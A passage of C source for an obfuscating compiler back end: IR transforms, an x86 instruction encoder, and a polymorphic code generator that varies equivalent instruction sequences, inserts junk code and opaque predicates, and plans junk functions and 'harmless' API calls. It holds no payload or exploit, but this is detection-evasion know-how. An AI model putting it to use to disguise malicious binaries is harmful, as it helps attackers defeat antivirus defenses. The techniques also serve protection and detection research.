                    while (k < g_mod->funcs[f].blocks[b].instr_count) {
                        ins = &g_mod->funcs[f].blocks[b].instrs[k];
                        if (ins->dest.kind == VK_GLOBAL) { ins->dest.index = perm[ins->dest.index]; }
                        if (ins->src1.kind == VK_GLOBAL) { ins->src1.index = perm[ins->src1.index]; }
                        if (ins->src2.kind == VK_GLOBAL) { ins->src2.index = perm[ins->src2.index]; }
                        i = 0;
                        while (i < ins->arg_count) {
                            if (ins->args[i].kind == VK_GLOBAL) { ins->args[i].index = perm[ins->args[i].index]; }
                            i = i + 1;
                        }
                        k = k + 1;
                    }
                    b = b + 1;
                }
            }
            f = f + 1;
        }
        free(perm);
    }
}

// Apply all IR transformations to module
void transform_module() {
    int f;
    struct Function* func;

    f = 0;
    while (f < g_mod->func_count) {
        func = &g_mod->funcs[f];
        if (func->block_count > 0) {
            if ((g_compile_flags & CF_IR_UNFOLD) != 0) {
                transform_unfold_constants(func);
            }
            if ((g_compile_flags & CF_IR_SUBSTITUTE) != 0) {
                transform_substitute_instrs(func);
            }
            if ((g_compile_flags & CF_IR_REORDER_INSTRS) != 0) {
                transform_reorder_instrs(func);
            }
            if ((g_compile_flags & CF_IR_DEADCODE) != 0) {
                transform_insert_dead_code(func);
            }
            if ((g_compile_flags & CF_IR_NOPS) != 0) {
                transform_insert_nops(func);
            }
            if ((g_compile_flags & CF_IR_REORDER_BLOCKS) != 0) {
                transform_reorder_blocks(func);
            }
            if ((g_compile_flags & CF_IR_REORDER_LOCALS) != 0) {
                transform_reorder_locals(func);
            }
            if ((g_compile_flags & (CF_IR_UNFOLD | CF_IR_SUBSTITUTE | CF_IR_DEADCODE | CF_IR_NOPS | CF_IR_REORDER_INSTRS | CF_IR_REORDER_BLOCKS | CF_IR_REORDER_LOCALS)) != 0) {
                transform_shuffle_temps(func);
            }
        }
        f = f + 1;
    }
    // Module-level transform: function order reordering
    if ((g_compile_flags & CF_IR_REORDER_FUNCS) != 0) {
        transform_reorder_funcs();
    }
}

// =============================================================================
//
// x86 Module
//
// Contains the following sections:
//   1. x86 Encoder
//   2. Additional x86 Helpers
//   3. Polymorphic Code Generation
//
// =============================================================================

// =============================================================================
// x86 Encoder
// =============================================================================

// x86 Register IDs
int REG_EAX = 0;
int REG_ECX = 1;
int REG_EDX = 2;
int REG_EBX = 3;
int REG_ESP = 4;
int REG_EBP = 5;
int REG_ESI = 6;
int REG_EDI = 7;

struct Buffer* g_code;

int modrm(int mod, int reg, int rm) {
    return ((mod & 3) << 6) | ((reg & 7) << 3) | (rm & 7);
}

void emit_byte(int b) {
    buf_write_u8(g_code, b);
}

void emit_u32(int val) {
    buf_write_u32(g_code, val);
}

void emit_mov_rr(int dst, int src) {
    emit_byte(0x89);
    emit_byte(modrm(3, src, dst));
}

void emit_mov_ri(int dst, int imm) {
    emit_byte(0xB8 + dst);
    emit_u32(imm);
}

void emit_mov_rm_disp(int dst, int base, int disp) {
    emit_byte(0x8B);
    if (base == REG_ESP) {
        emit_byte(modrm(2, dst, 4));
        emit_byte(0x24);
    } else {
        emit_byte(modrm(2, dst, base));
    }
    emit_u32(disp);
}

void emit_mov_mr_disp(int base, int disp, int src) {
    emit_byte(0x89);
    if (base == REG_ESP) {
        emit_byte(modrm(2, src, 4));
        emit_byte(0x24);
    } else {
        emit_byte(modrm(2, src, base));
    }
    emit_u32(disp);
}

void emit_push(int reg) {
    emit_byte(0x50 + reg);
}

void emit_pop(int reg) {
    emit_byte(0x58 + reg);
}

void emit_add_rr(int dst, int src) {
    emit_byte(0x01);
    emit_byte(modrm(3, src, dst));
}

void emit_add_ri(int dst, int imm) {
    emit_byte(0x81);
    emit_byte(modrm(3, 0, dst));
    emit_u32(imm);
}

void emit_sub_rr(int dst, int src) {
    emit_byte(0x29);
    emit_byte(modrm(3, src, dst));
}

void emit_sub_ri(int dst, int imm) {
    emit_byte(0x81);
    emit_byte(modrm(3, 5, dst));
    emit_u32(imm);
}

void emit_imul_rr(int dst, int src) {
    emit_byte(0x0F);
    emit_byte(0xAF);
    emit_byte(modrm(3, dst, src));
}

void emit_xor_rr(int dst, int src) {
    emit_byte(0x31);
    emit_byte(modrm(3, src, dst));
}

void emit_and_rr(int dst, int src) {
    emit_byte(0x21);
    emit_byte(modrm(3, src, dst));
}

void emit_or_rr(int dst, int src) {
    emit_byte(0x09);
    emit_byte(modrm(3, src, dst));
}

void emit_cmp_rr(int r1, int r2) {
    emit_byte(0x39);
    emit_byte(modrm(3, r2, r1));
}

void emit_test_rr(int r1, int r2) {
    emit_byte(0x85);
    emit_byte(modrm(3, r2, r1));
}

void emit_ret() {
    emit_byte(0xC3);
}

void emit_call_rel(int rel) {
    emit_byte(0xE8);
    emit_u32(rel);
}

void emit_jmp_rel(int rel) {
    emit_byte(0xE9);
    emit_u32(rel);
}

void emit_jcc_rel(int cc, int rel) {
    emit_byte(0x0F);
    emit_byte(0x80 + cc);
    emit_u32(rel);
}

void emit_jcc_short(int cc, int rel) {
    emit_byte(0x70 + cc);
    emit_byte(rel);
}

void emit_cdq() {
    emit_byte(0x99);
}

void emit_idiv(int src) {
    emit_byte(0xF7);
    emit_byte(modrm(3, 7, src));
}

void emit_neg(int reg) {
    emit_byte(0xF7);
    emit_byte(modrm(3, 3, reg));
}

void emit_not(int reg) {
    emit_byte(0xF7);
    emit_byte(modrm(3, 2, reg));
}

void emit_shl_cl(int reg) {
    emit_byte(0xD3);
    emit_byte(modrm(3, 4, reg));
}

void emit_shr_cl(int reg) {
    emit_byte(0xD3);
    emit_byte(modrm(3, 5, reg));
}

// MOV r32, [r32] (indirect load)
void emit_mov_rm(int dst, int base) {
    emit_byte(0x8B);
    emit_byte(modrm(0, dst, base));
}

// MOVZX r32, byte ptr [r32] (zero-extend byte load)
void emit_movzx_rm_byte(int dst, int base) {
    emit_byte(0x0F);
    emit_byte(0xB6);
    emit_byte(modrm(0, dst, base));
}

// MOV [r32], r32 (indirect store)
void emit_mov_mr(int base, int src) {
    emit_byte(0x89);
    emit_byte(modrm(0, src, base));
}

// MOV byte ptr [r32], r8 (indirect byte store)
void emit_mov_mr_byte(int base, int src) {
    emit_byte(0x88);
    emit_byte(modrm(0, src, base));
}

// MOV byte ptr [r32 + disp32], r8
void emit_mov_mr_disp_byte(int base, int disp, int src) {
    emit_byte(0x88);
    emit_byte(modrm(2, src, base));
    emit_u32(disp);
}

// =============================================================================
// Additional x86 Helpers
// =============================================================================

// INC r32
void emit_inc(int reg) {
    emit_byte(0x40 + reg);
}

// DEC r32
void emit_dec(int reg) {
    emit_byte(0x48 + reg);
}

// LEA dst, [base + index] (SIB-based)
void emit_lea_rr(int dst, int base, int index) {
    emit_byte(0x8D);
    emit_byte(modrm(0, dst, 4));
    emit_byte((index << 3) | base);
}

// LEA dst, [base + disp32]
void emit_lea_rd(int dst, int base, int disp) {
    emit_byte(0x8D);
    emit_byte(modrm(2, dst, base));
    emit_u32(disp);
}

// PUSH imm32
void emit_push_i(int imm) {
    emit_byte(0x68);
    emit_u32(imm);
}

// OR r32, imm32
void emit_or_ri(int reg, int imm) {
    emit_byte(0x81);
    emit_byte(modrm(3, 1, reg));
    emit_u32(imm);
}

// AND r32, imm32
void emit_and_ri(int reg, int imm) {
    emit_byte(0x81);
    emit_byte(modrm(3, 4, reg));
    emit_u32(imm);
}

// XOR r32, imm32
void emit_xor_ri(int reg, int imm) {
    emit_byte(0x81);
    emit_byte(modrm(3, 6, reg));
    emit_u32(imm);
}

// CMP r32, imm32
void emit_cmp_ri(int reg, int imm) {
    emit_byte(0x81);
    emit_byte(modrm(3, 7, reg));
    emit_u32(imm);
}

// Jcc placeholder: emit 0F 8x + 4-byte zero, return offset of the rel32
int emit_jcc_placeholder(int cc) {
    int offset;
    emit_byte(0x0F);
    emit_byte(0x80 + cc);
    offset = g_code->len;
    emit_u32(0);
    return offset;
}

// Fixup rel32 at given offset to jump to target
void emit_fixup_rel32(int offset, int target) {
    int rel;
    rel = target - (offset + 4);
    g_code->data[offset] = rel & 0xFF;
    g_code->data[offset + 1] = (rel >> 8) & 0xFF;
    g_code->data[offset + 2] = (rel >> 16) & 0xFF;
    g_code->data[offset + 3] = (rel >> 24) & 0xFF;
}

// =============================================================================
// Polymorphic Code Generation
// =============================================================================

// Condition codes for Jcc
int CC_E = 4;
int CC_NE = 5;
int CC_L = 12;
int CC_GE = 13;
int CC_LE = 14;
int CC_G = 15;

// --- ADD variants ---

void emit_add_v0(int dst, int src1, int src2) {
    if (dst != src1) { emit_mov_rr(dst, src1); }
    emit_add_rr(dst, src2);
}

void emit_add_v1(int dst, int src1, int src2) {
    emit_lea_rr(dst, src1, src2);
}

void emit_add_v2(int dst, int src1, int src2, int scratch) {
    emit_mov_rr(scratch, src2);
    emit_neg(scratch);
    if (dst != src1) { emit_mov_rr(dst, src1); }
    emit_sub_rr(dst, scratch);
}

void emit_add_v3(int dst, int src1, int src2) {
    emit_push(src1);
    emit_byte(0x01);
    emit_byte(0x04 | (src2 << 3));
    emit_byte(0x24);
    emit_pop(dst);
}

void emit_add_v4(int dst, int src1, int src2, int scratch) {
    emit_mov_rr(scratch, src1);
    emit_and_rr(scratch, src2);
    if (dst != src1) { emit_mov_rr(dst, src1); }
    emit_xor_rr(dst, src2);
    emit_add_rr(scratch, scratch);
    emit_add_rr(dst, scratch);
}

void emit_add_poly(int dst, int src1, int src2, int scratch) {
    int variant;
    variant = genome_pick(GI_ADD_WEIGHTS, 5);
    if (variant == 0) {
        emit_add_v0(dst, src1, src2);
    } else if (variant == 1) {
        emit_add_v1(dst, src1, src2);
    } else if (variant == 2) {
        emit_add_v2(dst, src1, src2, scratch);
    } else if (variant == 3) {
        emit_add_v3(dst, src1, src2);
    } else {
        emit_add_v4(dst, src1, src2, scratch);
    }
}

// --- SUB variants ---

void emit_sub_v0(int dst, int src1, int src2) {
    if (dst != src1) { emit_mov_rr(dst, src1); }
    emit_sub_rr(dst, src2);
}

void emit_sub_v1(int dst, int src1, int src2, int scratch) {
    emit_mov_rr(scratch, src2);
    emit_neg(scratch);
    if (dst != src1) { emit_mov_rr(dst, src1); }
    emit_add_rr(dst, scratch);
}

void emit_sub_v2(int dst, int src1, int src2) {
    emit_push(src1);
    emit_byte(0x29);
    emit_byte(0x04 | (src2 << 3));
    emit_byte(0x24);
    emit_pop(dst);
}

void emit_sub_v3(int dst, int src1, int src2, int scratch) {
    emit_mov_rr(scratch, src2);
    emit_not(scratch);
    if (dst != src1) { emit_mov_rr(dst, src1); }
    emit_add_rr(dst, scratch);
    emit_inc(dst);
}

void emit_sub_poly(int dst, int src1, int src2, int scratch) {
    int variant;
    variant = genome_pick(GI_SUB_WEIGHTS, 4);
    if (variant == 0) {
        emit_sub_v0(dst, src1, src2);
    } else if (variant == 1) {
        emit_sub_v1(dst, src1, src2, scratch);
    } else if (variant == 2) {
        emit_sub_v2(dst, src1, src2);
    } else {
        emit_sub_v3(dst, src1, src2, scratch);
    }
}

// --- MOV immediate variants ---

void emit_movi_v0(int dst, int imm) {
    emit_mov_ri(dst, imm);
}

void emit_movi_v1(int dst, int imm) {
    emit_xor_rr(dst, dst);
    if (imm != 0) { emit_add_ri(dst, imm); }
}

void emit_movi_v2(int dst, int imm) {
    emit_push_i(imm);
    emit_pop(dst);
}

void emit_movi_v3(int dst, int imm) {
    emit_xor_rr(dst, dst);
    if (imm != 0) { emit_lea_rd(dst, dst, imm); }
}

void emit_movi_v4(int dst, int imm) {
    int not_imm;
    not_imm = ~imm;
    emit_mov_ri(dst, not_imm);
    emit_not(dst);
}

void emit_movi_v5(int dst, int imm) {
    emit_xor_rr(dst, dst);
    emit_sub_ri(dst, 0 - imm);
}

void emit_movi_poly(int dst, int imm) {
    int variant;
    if (imm == 0) {
        variant = genome_pick(GI_MOVI_ZERO_WEIGHTS, 3);
        if (variant == 0) {
            emit_xor_rr(dst, dst);
        } else if (variant == 1) {
            emit_sub_rr(dst, dst);
        } else {
            emit_mov_ri(dst, 0);
        }
        return;
    }
    if (imm == 0 - 1) {
        variant = genome_pick(GI_MOVI_NEG1_WEIGHTS, 3);
        if (variant == 0) {
            emit_xor_rr(dst, dst);
            emit_dec(dst);
        } else if (variant == 1) {
            emit_xor_rr(dst, dst);
            emit_not(dst);
        } else {
            emit_mov_ri(dst, 0 - 1);
        }
        return;
    }
    variant = genome_pick(GI_MOVI_WEIGHTS, 6);
    if (variant == 0) {
        emit_movi_v0(dst, imm);
    } else if (variant == 1) {
        emit_movi_v1(dst, imm);
    } else if (variant == 2) {
        emit_movi_v2(dst, imm);
    } else if (variant == 3) {
        emit_movi_v3(dst, imm);
    } else if (variant == 4) {
        emit_movi_v4(dst, imm);
    } else {
        emit_movi_v5(dst, imm);
    }
}

// --- XOR variants ---

void emit_xor_v0(int dst, int src1, int src2) {
    if (dst != src1) { emit_mov_rr(dst, src1); }
    emit_xor_rr(dst, src2);
}

void emit_xor_v1(int dst, int src1, int src2) {
    emit_push(src1);
    emit_byte(0x31);
    emit_byte(0x04 | (src2 << 3));
    emit_byte(0x24);
    emit_pop(dst);
}

void emit_xor_v2(int dst, int src1, int src2, int s1, int s2) {
    emit_mov_rr(s1, src1);
    emit_or_rr(s1, src2);
    emit_mov_rr(s2, src1);
    emit_and_rr(s2, src2);
    emit_not(s2);
    emit_mov_rr(dst, s1);
    emit_and_rr(dst, s2);
}

void emit_xor_poly(int dst, int src1, int src2, int s1, int s2) {
    int variant;
    variant = genome_pick(GI_XOR_WEIGHTS, 3);
    if (variant == 0) {
        emit_xor_v0(dst, src1, src2);
    } else if (variant == 1) {
        emit_xor_v1(dst, src1, src2);
    } else {
        emit_xor_v2(dst, src1, src2, s1, s2);
    }
}

// --- CMP variants ---

void emit_cmp_poly(int r1, int r2, int scratch) {
    int variant;
    variant = genome_pick(GI_CMP_WEIGHTS, 2);
    if (variant == 0) {
        emit_cmp_rr(r1, r2);
    } else {
        emit_mov_rr(scratch, r1);
        emit_sub_rr(scratch, r2);
    }
}

// --- Dead code insertion ---

// Free register pool: EAX(0), ECX(1), EDX(2), ESI(6), EDI(7)
// Between IR instructions, all of these are free (values live on stack,
// EBX=PIC base, ESP/EBP=frame).
int g_free_regs_0;
int g_free_regs_1;
int g_free_regs_2;
int g_free_regs_3;
int g_free_regs_4;
int g_junk_ra_aware;

void init_free_regs() {
    g_free_regs_0 = REG_EAX;
    g_free_regs_1 = REG_ECX;
    g_free_regs_2 = REG_EDX;
    g_free_regs_3 = REG_ESI;
    g_free_regs_4 = REG_EDI;
    g_junk_ra_aware = 0;
}

int pick_free_reg() {
    int idx;
    int free_regs[8];
    int nfree;
    int i;
    int r;
    if (g_junk_ra_aware != 0) {
        nfree = 0;
        i = 0;
        while (i < g_ra_num_regs) {
            r = g_ra_reg_order[i];
            if (g_ra_alloc[r] < 0) {
                free_regs[nfree] = r;
                nfree = nfree + 1;
            }
            i = i + 1;
        }
        if (nfree == 0) { return REG_EAX; }
        return free_regs[prng_range(nfree)];
    }
    idx = prng_range(5);
    if (idx == 0) { return g_free_regs_0; }
    if (idx == 1) { return g_free_regs_1; }
    if (idx == 2) { return g_free_regs_2; }
    if (idx == 3) { return g_free_regs_3; }
    return g_free_regs_4;
}

int pick_any_reg() {
    return prng_range(8);
}

// Emit one specific junk pattern (0..7). Factored out so callers that need
// to pick the pattern themselves (e.g. emit_harmless_junk, which skips
// pattern 3) can do so without duplicating the body.
void emit_junk_pattern(int pattern) {
    int free1;
    int free2;
    int any1;
    int any2;
    int imm;
    int offset;

    free1 = pick_free_reg();
    free2 = pick_free_reg();
    any1 = pick_any_reg();
    any2 = pick_any_reg();
    imm = prng_range(256) + 1;

    if (pattern == 0) {
        // MOV free, any; ADD free, imm — address calculation
        emit_mov_rr(free1, any1);
        emit_add_ri(free1, imm);
    } else if (pattern == 1) {
        // MOV free, any; XOR free, imm; ADD free, any2 — hash computation
        emit_mov_rr(free1, any1);
        emit_xor_ri(free1, imm);
        emit_add_rr(free1, any2);
    } else if (pattern == 2) {
        // LEA free, [any + imm] — pointer arithmetic
        // Skip if any is ESP (reg 4, needs SIB)
        if (any1 != 4) {
            emit_lea_rd(free1, any1, imm);
        } else {
            emit_lea_rd(free1, REG_EAX, imm);
        }
    } else if (pattern == 3) {
        // PUSH any; MOV any, imm; OP any, imm; POP any — save/compute/restore
        // Use a safe reg (not ESP/EBP)
        if (any1 == 4 || any1 == 5) { any1 = REG_EAX; }
        emit_push(any1);
        emit_mov_ri(any1, imm);
        emit_add_ri(any1, prng_range(100) + 1);
        emit_pop(any1);
    } else if (pattern == 4) {
        // IMUL free, any; ADD free, imm — multiply-accumulate
        // Avoid IMUL with ESP
        if (any1 == 4) { any1 = REG_ECX; }
        emit_mov_rr(free1, any1);
        emit_imul_rr(free1, any1);
        emit_add_ri(free1, imm);
    } else if (pattern == 5) {
        // MOV free, imm; CMP free, any; Jcc+MOV — comparison+conditional set
        emit_mov_ri(free1, imm);
        if (any1 == 4) { any1 = REG_ECX; }
        emit_cmp_rr(free1, any1);
        emit_mov_ri(free1, 0);
        emit_jcc_short(prng_range(16), 5);
        emit_mov_ri(free1, 1);
    } else if (pattern == 6) {
        // XOR free, free; ADD free, any; SUB free, imm — zero+accumulate
        emit_xor_rr(free1, free1);
        emit_add_rr(free1, any1);
        emit_sub_ri(free1, imm);
    } else {
        // MOV free, [EBP - random_offset]; ADD free, imm — stack variable read
        offset = (prng_range(8) + 1) * 4;
        emit_mov_rm_disp(free1, REG_EBP, 0 - offset);
        emit_add_ri(free1, imm);
    }
}

// Random pick + emit. Existing call sites use this.
void emit_junk_sequence() {
    int pattern;
    pattern = genome_pick(GI_JUNK_SEQ_WEIGHTS, 8);
    emit_junk_pattern(pattern);
}

void insert_dead_code(int max_bytes) {
    int bytes_used;

    bytes_used = 0;
    while (bytes_used < max_bytes) {
        emit_junk_sequence();
        bytes_used = bytes_used + 8;
    }
}

// --- Opaque predicates ---

int emit_opaque_true(int s1, int s2) {
    int variant;
    int jump_offset;
    int x;

    variant = genome_pick(GI_OPAQUE_WEIGHTS, 3);
    if (variant == 0) {
        x = prng_range(1000);
        emit_mov_ri(s1, x);
        emit_mov_rr(s2, s1);
        emit_inc(s2);
        emit_imul_rr(s1, s2);
        emit_and_ri(s1, 1);
        emit_test_rr(s1, s1);
        jump_offset = emit_jcc_placeholder(CC_E);
    } else if (variant == 1) {
        x = prng_range(100) - 50;
        emit_mov_ri(s1, x);
        emit_imul_rr(s1, s1);
        emit_cmp_ri(s1, 0);
        jump_offset = emit_jcc_placeholder(CC_GE);
    } else {
        x = prng_range(1000);
        emit_mov_ri(s1, x);
        emit_or_ri(s1, 1);
        emit_test_rr(s1, s1);
        jump_offset = emit_jcc_placeholder(CC_NE);
    }
    return jump_offset;
}

void insert_opaque_block(int s1, int s2) {
    int jump_offset;
    int dead_size;

    jump_offset = emit_opaque_true(s1, s2);
    dead_size = prng_range(8) + 4;
    insert_dead_code(dead_size);
    emit_fixup_rel32(jump_offset, g_code->len);
}

void maybe_insert_dead(int probability) {
    int size;
    if (prng_range(100) < probability) {
        size = prng_range(6) + 1;
        insert_dead_code(size);
    }
}

void maybe_insert_opaque(int s1, int s2, int probability) {
    if (prng_range(100) < probability) {
        insert_opaque_block(s1, s2);
    }
}

// =============================================================================
//
// Code Generator Module
//
// Contains the following sections:
//   1. Code Generator State
//   2. Register Allocator
//   3. Code Generator — Helpers
//   4. Code Generator
//   5. Name Randomization
//   6. String and Global emission
//   7. Module code generation
//   8. Codegen initialization helper
//
// =============================================================================

// =============================================================================
// Code Generator State
// =============================================================================

struct Module* g_mod;
int g_compile_flags;
int* g_func_offsets;
int* g_block_offsets;
int* g_temp_spill;
int g_stack_size;
int g_pic_mode;
int g_abs_mode;  // 0=off, 1=PE, 2=ELF
int g_api_slot_offset;
int g_entry_func_idx;
int g_x86_poly_instrs;
int g_x86_dead_code;
int g_x86_opaque;
int g_x86_junk_funcs;
int g_x86_harmless_calls;
int g_x86_shuffle_funcs;
int g_cdecl_externs;
int g_res_reg;
int g_op_reg;
int g_scr_reg;
struct Function* g_current_func;

// Register allocator state
int* g_ra_alloc;       // [8]: alloc[reg] = temp idx (>=0), -1=free, -2=scratch
int* g_ra_temp_reg;    // [temp_count]: register holding each temp (-1=on stack)
int* g_ra_dirty;       // [temp_count]: 1=register value newer than stack copy
int* g_ra_reg_order;   // [8]: PRNG-shuffled register preference order
int g_ra_num_regs;     // 5 (PIC) or 6 (non-PIC)
int* g_ra_last_use;    // [temp_count]: per-block last-use instr index
int g_ra_cur_instr;    // current instruction index within block
int* g_ra_temp_last_block;
int g_ra_cur_block;

// Fixups
int* g_fixup_offsets;
int* g_fixup_targets;
int g_fixup_count;
int g_fixup_cap;

// String fixups
int* g_str_offsets;
struct Buffer* g_data;
int* g_str_fixup_offsets;
int* g_str_fixup_indices;
int* g_str_fixup_bases;
int g_str_fixup_count;
int g_str_fixup_cap;

// Global fixups
int* g_glob_fixup_offsets;
int* g_glob_fixup_indices;
int* g_glob_fixup_bases;
int g_glob_fixup_count;
int g_glob_fixup_cap;

// Global variable offsets in data section
int* g_global_offsets;

// Absolute-mode fixups (deferred until PE/ELF layout is known by caller)
int* g_abs_data_fixup_offsets;
int* g_abs_data_fixup_data_offs;
int g_abs_data_fixup_count;
int g_abs_data_fixup_cap;
int* g_abs_extern_fixup_offsets;
int* g_abs_extern_fixup_slots;
int g_abs_extern_fixup_count;
int g_abs_extern_fixup_cap;
int* g_abs_call_fixup_offsets;
int* g_abs_call_fixup_targets;
int g_abs_call_fixup_count;
int g_abs_call_fixup_cap;
int* g_abs_faddr_fixup_offsets;
int* g_abs_faddr_fixup_targets;
int g_abs_faddr_fixup_count;
int g_abs_faddr_fixup_cap;

// Fixup sizes for forward jumps
int* g_fixup_sizes;

// Call fixups (for function reordering)
int* g_call_fixup_offsets;
int* g_call_fixup_targets;
int g_call_fixup_count;
int g_call_fixup_cap;

// FUNC_ADDR fixups (for &func_name — gets function code address)
int* g_faddr_fixup_offsets;   // offset in code buffer of the imm32 in ADD
int* g_faddr_fixup_targets;   // function index
int g_faddr_fixup_count;
int g_faddr_fixup_cap;

// Harmless API data
int* g_harmless_api_indices;
int g_harmless_api_count;

// Junk function data
int* g_junk_func_offsets;
int g_junk_func_count;
int* g_junk_call_fixup_offsets;
int* g_junk_call_fixup_targets;
int g_junk_call_fixup_count;
int g_junk_call_fixup_cap;

void add_fixup(int offset, int target_block, int instr_size) {
    int new_cap;
    int* new_off;
    int* new_tgt;
    int* new_sz;
    int i;
    if (g_fixup_count >= g_fixup_cap) {
        new_cap = g_fixup_cap * 2;
        new_off = malloc(new_cap * 4);
        new_tgt = malloc(new_cap * 4);
        new_sz = malloc(new_cap * 4);
        i = 0;
        while (i < g_fixup_count) {
            new_off[i] = g_fixup_offsets[i];
            new_tgt[i] = g_fixup_targets[i];
            new_sz[i] = g_fixup_sizes[i];
            i = i + 1;
        }
        free(g_fixup_offsets);
        free(g_fixup_targets);
        free(g_fixup_sizes);
        g_fixup_offsets = new_off;
        g_fixup_targets = new_tgt;
        g_fixup_sizes = new_sz;
        g_fixup_cap = new_cap;
    }
    g_fixup_offsets[g_fixup_count] = offset;
    g_fixup_targets[g_fixup_count] = target_block;
    g_fixup_sizes[g_fixup_count] = instr_size;
    g_fixup_count = g_fixup_count + 1;
}

void grow_str_fixups() {
    int new_cap;
    int* new_off;
    int* new_idx;
    int* new_bas;
    int i;
    new_cap = g_str_fixup_cap * 2;
    new_off = malloc(new_cap * 4);
    new_idx = malloc(new_cap * 4);
    new_bas = malloc(new_cap * 4);
    i = 0;
    while (i < g_str_fixup_count) {
        new_off[i] = g_str_fixup_offsets[i];
        new_idx[i] = g_str_fixup_indices[i];
        new_bas[i] = g_str_fixup_bases[i];
        i = i + 1;
    }
    free(g_str_fixup_offsets);
    free(g_str_fixup_indices);
    free(g_str_fixup_bases);
    g_str_fixup_offsets = new_off;
    g_str_fixup_indices = new_idx;
    g_str_fixup_bases = new_bas;
    g_str_fixup_cap = new_cap;
}

void add_str_fixup(int offset, int str_idx, int base) {
    if (g_str_fixup_count >= g_str_fixup_cap) {
        grow_str_fixups();
    }
    g_str_fixup_offsets[g_str_fixup_count] = offset;
    g_str_fixup_indices[g_str_fixup_count] = str_idx;
    g_str_fixup_bases[g_str_fixup_count] = base;
    g_str_fixup_count = g_str_fixup_count + 1;
}

void grow_glob_fixups() {
    int new_cap;
    int* new_off;
    int* new_idx;
    int* new_bas;
    int i;
    new_cap = g_glob_fixup_cap * 2;
    new_off = malloc(new_cap * 4);
    new_idx = malloc(new_cap * 4);
    new_bas = malloc(new_cap * 4);
    i = 0;
    while (i < g_glob_fixup_count) {
        new_off[i] = g_glob_fixup_offsets[i];
        new_idx[i] = g_glob_fixup_indices[i];
        new_bas[i] = g_glob_fixup_bases[i];
        i = i + 1;
    }
    free(g_glob_fixup_offsets);
    free(g_glob_fixup_indices);
    free(g_glob_fixup_bases);
    g_glob_fixup_offsets = new_off;
    g_glob_fixup_indices = new_idx;
    g_glob_fixup_bases = new_bas;
    g_glob_fixup_cap = new_cap;
}

void add_glob_fixup(int offset, int glob_idx, int base) {
    if (g_glob_fixup_count >= g_glob_fixup_cap) {
        grow_glob_fixups();
    }
    g_glob_fixup_offsets[g_glob_fixup_count] = offset;
    g_glob_fixup_indices[g_glob_fixup_count] = glob_idx;
    g_glob_fixup_bases[g_glob_fixup_count] = base;
    g_glob_fixup_count = g_glob_fixup_count + 1;
}

void add_abs_data_fixup(int code_offset, int data_section_offset) {
    int new_cap;
    int* new_off;
    int* new_dat;
    int i;
    if (g_abs_data_fixup_count >= g_abs_data_fixup_cap) {
        new_cap = g_abs_data_fixup_cap * 2;
        new_off = malloc(new_cap * 4);
        new_dat = malloc(new_cap * 4);
        i = 0;
        while (i < g_abs_data_fixup_count) {
            new_off[i] = g_abs_data_fixup_offsets[i];
            new_dat[i] = g_abs_data_fixup_data_offs[i];
            i = i + 1;
        }
        free(g_abs_data_fixup_offsets);
        free(g_abs_data_fixup_data_offs);
        g_abs_data_fixup_offsets = new_off;
        g_abs_data_fixup_data_offs = new_dat;
        g_abs_data_fixup_cap = new_cap;
    }
    g_abs_data_fixup_offsets[g_abs_data_fixup_count] = code_offset;
    g_abs_data_fixup_data_offs[g_abs_data_fixup_count] = data_section_offset;
    g_abs_data_fixup_count = g_abs_data_fixup_count + 1;
}

void add_abs_extern_fixup(int code_offset, int api_slot) {
    int new_cap;
    int* new_off;
    int* new_slt;
    int i;
    if (g_abs_extern_fixup_count >= g_abs_extern_fixup_cap) {
        new_cap = g_abs_extern_fixup_cap * 2;
        new_off = malloc(new_cap * 4);
        new_slt = malloc(new_cap * 4);
        i = 0;
        while (i < g_abs_extern_fixup_count) {
            new_off[i] = g_abs_extern_fixup_offsets[i];
            new_slt[i] = g_abs_extern_fixup_slots[i];
            i = i + 1;
        }
        free(g_abs_extern_fixup_offsets);
        free(g_abs_extern_fixup_slots);
        g_abs_extern_fixup_offsets = new_off;
        g_abs_extern_fixup_slots = new_slt;
        g_abs_extern_fixup_cap = new_cap;
    }
    g_abs_extern_fixup_offsets[g_abs_extern_fixup_count] = code_offset;
    g_abs_extern_fixup_slots[g_abs_extern_fixup_count] = api_slot;
    g_abs_extern_fixup_count = g_abs_extern_fixup_count + 1;
}

void add_call_fixup(int offset, int func_idx) {
    int new_cap;
    int* new_off;
    int* new_tgt;
    int i;
    if (g_call_fixup_count >= g_call_fixup_cap) {
        new_cap = g_call_fixup_cap * 2;
        new_off = malloc(new_cap * 4);
        new_tgt = malloc(new_cap * 4);
        i = 0;
        while (i < g_call_fixup_count) {
            new_off[i] = g_call_fixup_offsets[i];
            new_tgt[i] = g_call_fixup_targets[i];
            i = i + 1;
        }
        free(g_call_fixup_offsets);
        free(g_call_fixup_targets);
        g_call_fixup_offsets = new_off;
        g_call_fixup_targets = new_tgt;
        g_call_fixup_cap = new_cap;
    }
    g_call_fixup_offsets[g_call_fixup_count] = offset;
    g_call_fixup_targets[g_call_fixup_count] = func_idx;
    g_call_fixup_count = g_call_fixup_count + 1;
}

void add_abs_call_fixup(int code_offset, int target_code_offset) {
    int new_cap;
    int* new_off;
    int* new_tgt;
    int i;
    if (g_abs_call_fixup_count >= g_abs_call_fixup_cap) {
        new_cap = g_abs_call_fixup_cap * 2;
        new_off = malloc(new_cap * 4);
        new_tgt = malloc(new_cap * 4);
        i = 0;
        while (i < g_abs_call_fixup_count) {
            new_off[i] = g_abs_call_fixup_offsets[i];
            new_tgt[i] = g_abs_call_fixup_targets[i];
            i = i + 1;
        }
        free(g_abs_call_fixup_offsets);
        free(g_abs_call_fixup_targets);
        g_abs_call_fixup_offsets = new_off;
        g_abs_call_fixup_targets = new_tgt;
        g_abs_call_fixup_cap = new_cap;
    }
    g_abs_call_fixup_offsets[g_abs_call_fixup_count] = code_offset;
    g_abs_call_fixup_targets[g_abs_call_fixup_count] = target_code_offset;
    g_abs_call_fixup_count = g_abs_call_fixup_count + 1;
}

void add_abs_faddr_fixup(int code_offset, int target_code_offset) {
    int new_cap;
    int* new_off;
    int* new_tgt;
    int i;
    if (g_abs_faddr_fixup_count >= g_abs_faddr_fixup_cap) {
        new_cap = g_abs_faddr_fixup_cap * 2;
        new_off = malloc(new_cap * 4);
        new_tgt = malloc(new_cap * 4);
        i = 0;
        while (i < g_abs_faddr_fixup_count) {
            new_off[i] = g_abs_faddr_fixup_offsets[i];
            new_tgt[i] = g_abs_faddr_fixup_targets[i];
            i = i + 1;
        }
        free(g_abs_faddr_fixup_offsets);
        free(g_abs_faddr_fixup_targets);
        g_abs_faddr_fixup_offsets = new_off;
        g_abs_faddr_fixup_targets = new_tgt;
        g_abs_faddr_fixup_cap = new_cap;
    }
